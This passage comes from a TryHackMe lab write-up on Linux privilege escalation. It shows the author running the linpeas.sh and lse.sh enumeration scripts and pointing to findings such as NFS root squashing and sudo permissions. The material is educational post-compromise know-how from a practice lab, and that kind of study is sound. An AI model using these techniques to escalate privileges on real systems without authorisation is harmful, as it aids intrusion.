![Lin Enum](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Priv_Esc_Scripts_Lin_Enum.png)

Running Linpeas, we can see everything it comes up with, including things we previously found. Like the NFS root squashing.

```cmd
./linpeas.sh
```

![Linpeas](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Priv_Esc_Scripts_Linpeas.png)

Running LSE, we can see everything it comes up with, including things we previously found. Like sudo permissions.

```cmd
./lse.sh
```

![LSE](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/linuxprivesc/Priv_Esc_Scripts_LSE.png)
